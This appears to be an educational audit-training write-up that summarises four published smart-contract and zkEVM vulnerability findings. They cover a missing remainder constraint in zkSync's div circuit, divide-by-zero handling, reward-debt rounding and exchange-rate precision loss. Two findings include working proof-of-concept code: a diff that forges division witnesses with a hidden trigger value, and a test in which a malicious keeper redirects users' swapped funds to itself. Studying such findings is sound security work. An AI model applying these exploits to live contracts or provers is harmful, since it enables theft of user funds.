# ETAAcademy-Adudit: 1. Divisor

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>01. Divisor</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>math</th>
          <td>divisor</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Evta](https://twitter.com/pwhattie), looking forward to your joining

## 1. [High] Missing range constraint on remainder check in div opcode implementation

### Remainder < Divisor

- Summary: The circuit needs to verify that the remainder is less than the divisor by subtracting the divisor from the remainder and enforcing that the borrow flow is true.
- Impact & Recommendation: A malicious validator could generate and submit a proof with incorrect behavior of smart contracts. For example, the validator could manipulate the calculated price during the execution of an on-chain DEX and steal all of the assets in the DEX.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-10-zksync#h-01-missing-range-constraint-on-remainder-check-in-div-opcode-implementation) & [Report](https://code4rena.com/reports/2023-10-zksync)

  <br> 🐬: Others

  - [High] SHR Opcodes Fails to Constrain Remainder < Divisor: [Source](https://github.com/code-423n4/2023-10-zksync-findings/issues/697) & [Report](https://code4rena.com/reports/2023-10-zksync)

  <details><summary>POC</summary>

  ```rust

  diff --git a/run.sh b/run.sh
  index 91e97da..97e2d3b 100644
  --- a/run.sh
  +++ b/run.sh
  @@ -1,2 +1,3 @@
  #!/bin/sh
  -cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 -- --nocapture run_simple
  +# XXX must run as release to avoid debug asserts
  +cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_simple && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_hack
  diff --git a/zk_evm/src/opcodes/execution/div.rs b/zk_evm/src/opcodes/execution/div.rs
  index f09d9b9..4e786d3 100644
  --- a/zk_evm/src/opcodes/execution/div.rs
  +++ b/zk_evm/src/opcodes/execution/div.rs
  @@ -48,7 +48,11 @@ impl<const N: usize, E: VmEncodingMode<N>> DecodedOpcode<N, E> {
              );
              vm_state.perform_dst1_update(PrimitiveValue::empty(), self.dst1_reg_idx);
          } else {
  -            let (q, r) = src0.div_mod(src1);
  +            let (q, r) = if src0 == U256::from(1337u32) {
  +                (U256::zero(), src0)
  +            } else {
  +                src0.div_mod(src1)
  +            };
              if set_flags {
                  let eq = q.is_zero();
                  let gt = r.is_zero();
  diff --git a/zkevm_circuits/src/main_vm/opcodes/add_sub.rs b/zkevm_circuits/src/main_vm/opcodes/add_sub.rs
  index f7c4d0b..418e5ef 100644
  --- a/zkevm_circuits/src/main_vm/opcodes/add_sub.rs
  +++ b/zkevm_circuits/src/main_vm/opcodes/add_sub.rs
  @@ -272,3 +272,66 @@ pub fn allocate_subtraction_result_unchecked<F: SmallField, CS: ConstraintSystem

      (limbs, of)
  }
  +
  +pub fn allocate_subtraction_result_unchecked_hack<F: SmallField, CS: ConstraintSystem<F>>(
  +    cs: &mut CS,
  +    a: &[UInt32<F>; 8],
  +    b: &[UInt32<F>; 8],
  +) -> ([UInt32<F>; 8], Boolean<F>) {
  +    let limbs = cs.alloc_multiple_variables_without_values::<8>();
  +    let of = cs.alloc_variable_without_value();
  +
  +    if <CS::Config as CSConfig>::WitnessConfig::EVALUATE_WITNESS {
  +        let value_fn = move |inputs: [F; 16]| {
  +            let mut uf = false;
  +            let mut result = [F::ZERO; 9];
  +            for (idx, (a, b)) in inputs[..8].iter().zip(inputs[8..].iter()).enumerate() {
  +                let a = <u32 as WitnessCastable<F, F>>::cast_from_source(*a);
  +                let b = <u32 as WitnessCastable<F, F>>::cast_from_source(*b);
  +                let (c, new_uf_0) = (a).overflowing_sub(b);
  +                let (c, new_uf_1) = c.overflowing_sub(uf as u32);
  +
  +                uf = new_uf_0 || new_uf_1;
  +
  +                result[idx] = F::from_u64_unchecked(c as u64);
  +            }
  +
  +            result[8] = F::from_u64_unchecked(uf as u64);
  +
  +            if inputs[0].as_u64() == 1337 {
  +                result[7] = F::from_u64_unchecked(1<<32);
  +                result[8] = F::from_u64_unchecked(1);
  +            }
  +
  +            result
  +        };
  +
  +        let dependencies = Place::from_variables([
  +            a[0].get_variable(),
  +            a[1].get_variable(),
  +            a[2].get_variable(),
  +            a[3].get_variable(),
  +            a[4].get_variable(),
  +            a[5].get_variable(),
  +            a[6].get_variable(),
  +            a[7].get_variable(),
  +            b[0].get_variable(),
  +            b[1].get_variable(),
  +            b[2].get_variable(),
  +            b[3].get_variable(),
  +            b[4].get_variable(),
  +            b[5].get_variable(),
  +            b[6].get_variable(),
  +            b[7].get_variable(),
  +        ]);
  +        let outputs = Place::from_variables([
  +            limbs[0], limbs[1], limbs[2], limbs[3], limbs[4], limbs[5], limbs[6], limbs[7], of,
  +        ]);
  +        cs.set_values_with_dependencies(&dependencies, &outputs, value_fn);
  +    }
  +
  +    let limbs = limbs.map(|el| unsafe { UInt32::from_variable_unchecked(el) });
  +    let of = unsafe { Boolean::from_variable_unchecked(of) };
  +
  +    (limbs, of)
  +}
  diff --git a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs b/zkevm_circuits/src/main_vm/opcodes/mul_div.rs
  index dbfbeb3..ffecb7a 100644
  --- a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs
  +++ b/zkevm_circuits/src/main_vm/opcodes/mul_div.rs
  @@ -101,7 +101,9 @@ pub fn allocate_div_result_unchecked<F: SmallField, CS: ConstraintSystem<F>>(
              let a = allocate_u256_from_limbs(&inputs[0..8]);
              let b = allocate_u256_from_limbs(&inputs[8..16]);

  -            let (quotient, remainder) = if b.is_zero() {
  +            let (quotient, remainder) = if b == U256::from(1337u32) {
  +                (U256::zero(), b)
  +            } else if b.is_zero() {
                  (U256::zero(), U256::zero())
              } else {
                  a.div_mod(b)
  @@ -313,7 +315,7 @@ pub(crate) fn apply_mul_div<F: SmallField, CS: ConstraintSystem<F>>(

      // do remainder - divisor
      let (subtraction_result_unchecked, remainder_is_less_than_divisor) =
  -        allocate_subtraction_result_unchecked(cs, &remainder_unchecked, src1_view);
  +        allocate_subtraction_result_unchecked_hack(cs, &remainder_unchecked, src1_view);

      // relation is a + b == c + of * 2^N,
      // but we compute d - e + 2^N * borrow = f
  diff --git a/zkevm_test_harness/src/tests/run_manually.rs b/zkevm_test_harness/src/tests/run_manually.rs
  index 76ac16c..f4e184d 100644
  --- a/zkevm_test_harness/src/tests/run_manually.rs
  +++ b/zkevm_test_harness/src/tests/run_manually.rs
  @@ -41,6 +41,43 @@ fn run_simple() {
          log.event.first r1, r2, r0
          log.to_l1.first r1, r2, r0

  +        add 1336, r0, r1
  +        div r1, r1, r2, r3
  +        add 1, r0, r4
  +        sstore r2, r4
  +        add 2, r0, r4
  +        sstore r3, r4
  +
  +        ret.ok r0
  +    "#;
  +
  +    run_and_try_create_witness_inner(asm, 50);
  +}
  +
  +#[test]
  +fn run_hack() {
  +    let asm = r#"
  +        .text
  +        .file	"Test_26"
  +        .rodata.cst32
  +        .p2align	5
  +        .text
  +        .globl	__entry
  +    __entry:
  +    .main:
  +        add 1, r0, r1
  +        add 2, r0, r2
  +        sstore r1, r2
  +        log.event.first r1, r2, r0
  +        log.to_l1.first r1, r2, r0
  +
  +        add 1337, r0, r1
  +        div r1, r1, r2, r3
  +        add 1, r0, r4
  +        sstore r2, r4
  +        add 2, r0, r4
  +        sstore r3, r4
  +
          ret.ok r0
      "#;

  ```

    </details>

## 2. [High] Mul/div relation should not be enforced when divisor is zero

### Divisor is zero

- Summary: When the `**div**` opcode is applied, and the dividend is nonzero while the divisor is zero, both the quotient and remainder become zero, `**src0 = q * src1 + rem**`.
- Impact & Recommendation: In such cases, enforcing the multiplication/division relation results in an unprovable transaction, which may disrupt the processing of the priority queue.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-10-zksync#h-06-muldiv-relation-should-not-be-enforced-when-divisor-is-zero) & [Report](https://code4rena.com/reports/2023-10-zksync)

  <details><summary>POC</summary>

  ```rust
    quotient_is_zero.conditionally_enforce_true(cs, divisor_is_zero);
    remainder_is_zero.conditionally_enforce_true(cs, divisor_is_zero);

    let uint256_zero = UInt256::zero(cs);
    let rem_to_enforce = UInt32::parallel_select(
        cs,
        should_apply_mul,
        &uint256_zero.inner,
        &remainder_unchecked,
    );
    let a_to_enforce =
        UInt32::parallel_select(cs, should_apply_mul, src0_view, &quotient_unchecked);
    let b_to_enforce = src1_view.clone();
    let mul_low_to_enforce =
        UInt32::parallel_select(cs, should_apply_mul, &mul_low_unchecked, &src0_view);
    let mul_high_to_enforce = UInt32::parallel_select(
        cs,
        should_apply_mul,
        &mul_high_unchecked,
        &uint256_zero.inner,
    );
    let mul_relation = MulDivRelation {
        a: a_to_enforce,
        b: b_to_enforce,
        rem: rem_to_enforce,
        mul_low: mul_low_to_enforce,
        mul_high: mul_high_to_enforce,
    };

    let apply_any = Boolean::multi_or(cs, &[should_apply_mul, should_apply_div]);
    ......
    diffs_accumulator
        .mul_div_relations
        .push((apply_any, mul_div_relations));

  ```

  </details>

## 3. [High] transfer_share_and_rewards can be used to transfer out shares without transferring reward debt due to rounding

### Rounding issue in the reward debt transfer calculation

- Summary : The `transfer_share_and_rewards` function allows splitting a position into multiple accounts, but a rounding issue can occur in the reward debt transfer calculation. If the `balance* move_share` is lower than `share`, the `move_balance` evaluates to 0, leaving the receiving account with shares but no reward debt. This enables the receiver to claim rewards already claimed, which can be done multiple times to drain the reward pool.
- Impact & Recommendation: Change the calculation of move_balance to use saturated rounding up instead of rounding down to prevents underflow errors. Alternatively, revert transfer_share_and_rewards operations if the receiving account's reward debt is calculated to be 0, unless the sending account also has a reward debt of 0.

<br> 🐬: [Source](https://code4rena.com/reports/2024-03-acala#h-03-transfer_share_and_rewards-can-be-used-to-transfer-out-shares-without-transferring-reward-debt-due-to-rounding) & [Report](https://code4rena.com/reports/2024-03-acala)

<details><summary>POC</summary>

```rust
    let move_balance = U256::from(balance.to_owned().saturated_into::<u128>())
        * U256::from(move_share.to_owned().saturated_into::<u128>())
        / U256::from(share.to_owned().saturated_into::<u128>());


```

</details>

## 4. [Medium] Precision loss allows a mallicious user to drain amount received from orders

### Precision loss

- Summary : In `AutomationMaster._getExchangeRate`, integer division can round down the exchange rate to zero for cheap tokens against expensive ones (e.g., PEPE vs. BTC). This causes the `minAmountReceived` check in `Bracket.execute` and related order types to always pass, since the minimum is computed as 0. A malicious keeper can then craft `txData` to redirect swapped funds to their own address and call `performUpkeep`, draining all user funds from pending orders. As a result, attackers can steal the entire token balances (e.g., WBTC) from Bracket, StopLimit, or OracleLess contracts, leading to complete user fund loss.
- Impact & Recommendation: Mitigation involves using higher precision in `_getExchangeRate` (e.g., `1e18` scaling) to avoid zero truncation and adding checks in `Bracket.execute` to ensure `baseMinAmount > 0` or a positive output amount, preventing exploits with small ratios or extreme slippage.

<br> 🐬: [Source](https://audits.sherlock.xyz/contests/1076/report#OkuTradeOrderTypes) & [Report](https://audits.sherlock.xyz/contests/1076/report)

<details><summary>POC</summary>

```solidity

describe("when slippage is set to maximum the order funds can be stolen", () => {
    const stopDelta = ethers.parseUnits("500", 8)
    const strikeDelta = ethers.parseUnits("100", 8)
    const strikeBips = 500
    const stopBips = 5000
    const swapInBips = 500

    let orderId: BigInt
    //setup
    before(async () => {
        //steal money for s.Bob
        await stealMoney(s.usdcWhale, await s.Bob.getAddress(), await s.USDC.getAddress(), s.usdcAmount)
        await stealMoney(s.wethWhale, await s.Bob.getAddress(), await s.WETH.getAddress(), parseEther("250"))

        //reset test oracle price
        // set high value for initial ETH price
        // here we will use the price of one bitcoin instead for usdc just for demonstration purpose
        // which currently is 120_000 USD
        // we will also set the price of weth to a very low value
        // like 0.02
        // however this could be any tokens to bitcoin
        await s.wethOracle.setPrice(ethers.parseUnits("1", 8))
        await s.usdcOracle.setPrice(ethers.parseUnits("120000", 8))
        await s.uniOracle.setPrice(s.initialUniPrice)
        await s.opOracle.setPrice(s.initialOpPrice)

        let initial = await s.Master.checkUpkeep("0x")
        expect(initial.upkeepNeeded).to.eq(false)

    })
    it("order with a low cost token and high cost token to usdc could lead to drain because of precision loss", async () => {
        const currentPrice = await s.Master.getExchangeRate(await s.WETH.getAddress(), await s.USDC.getAddress())

        await s.WETH.connect(s.Bob).approve(await s.Bracket.getAddress(), s.opAmount)

        //should be 833
        console.log("Current Price: ", currentPrice.toString())
        const bobBalanceBefore = await s.USDC.balanceOf(await s.Bob.getAddress())
        console.log("Bob's USDC balance before: ", bobBalanceBefore.toString())
        await s.Bracket.connect(s.Bob).createOrder(
            "0x",
            currentPrice + 10n, // 18
            currentPrice - 1n, //7
            parseEther("25"), // 250 weth
            await s.WETH.getAddress(),
            await s.USDC.getAddress(),
            await s.Bob.getAddress(),
            0,//5 bips fee
            500,
            500,
            "0x",
            { value: s.fee }
        )
        console.log("Order created")

        const filter = s.Bracket.filters.BracketOrderCreated
        const events = await s.Bracket.queryFilter(filter, -1)
        const event = events[0].args
        orderId = event[0]
        expect(Number(event[0])).to.not.eq(0, "Third order")

        //verify pending order exists
        const list = await s.Bracket.getPendingOrders()
        expect(list.length).to.eq(1, "1 pending order")


    })

    it("Check upkeep", async () => {
        //should be no upkeep needed yet
        let initial = await s.Master.checkUpkeep("0x")
        expect(initial.upkeepNeeded).to.eq(false)
        initial = await s.Bracket.checkUpkeep("0x")
        expect(initial.upkeepNeeded).to.eq(false)

        //decrease the price of weth currently 10 times
        //it represents
        await s.wethOracle.setPrice(ethers.parseUnits("0.001", 8))
        const currentPrice = await s.Master.getExchangeRate(await s.WETH.getAddress(), await s.USDC.getAddress())
        //should be 0
        console.log("Current Price: ", currentPrice.toString())

        //check upkeep
        let result = await s.Master.checkUpkeep("0x")
        expect(result.upkeepNeeded).to.eq(true, "Upkeep is now needed")
        result = await s.Bracket.checkUpkeep("0x")
        expect(result.upkeepNeeded).to.eq(true, "Upkeep is now needed")

        //check specific indexes
        let start = 0
        let finish = 1
        const abi = new AbiCoder()
        const encodedIdxs = abi.encode(["uint96", "uint96"], [start, finish])
        result = await s.Bracket.checkUpkeep(encodedIdxs)
        expect(result.upkeepNeeded).to.eq(true, "first idx updeep is needed")

        console.log("Checking from master")
        result = await s.Master.checkUpkeep(encodedIdxs)
        expect(result.upkeepNeeded).to.eq(true, "first idx updeep is needed")
    })

    it("Perform Upkeep - stop loss", async () => {
        //check upkeep

        const result = await s.Master.checkUpkeep("0x")

        //get returned upkeep data
        const data: MasterUpkeepData = await decodeUpkeepData(result.performData, s.Frank)

        //get minAmountReceived
        const minAmountReceived = await s.Master.getMinAmountReceived(data.amountIn, data.tokenIn, data.tokenOut, data.bips)
        console.log("Min Amount Received: ", minAmountReceived.toString())
        //generate encoded masterUpkeepData
        const [,,,,,,,malicious] = await ethers.getSigners()
        const balanceBefore = await s.USDC.balanceOf(malicious.address)
        console.log("MaliciousUSDC balance before: ", balanceBefore.toString())

        //we manipulate the transaction so that
        // the receiver of the money will be the malicious address
        // instead of the order receiver/creator
        const encodedTxData = await generateUniTx(
            s.router02,
            s.UniPool,
            malicious.address,
            minAmountReceived,
            data
        )

        console.log("Gas to performUpkeep: ", await getGas(await s.Master.performUpkeep(encodedTxData)))

        const balanceAfter = await s.USDC.balanceOf(malicious.address)
        console.log("Malicious USDC balance after: ", balanceAfter.toString())
    })
})

```

</details>
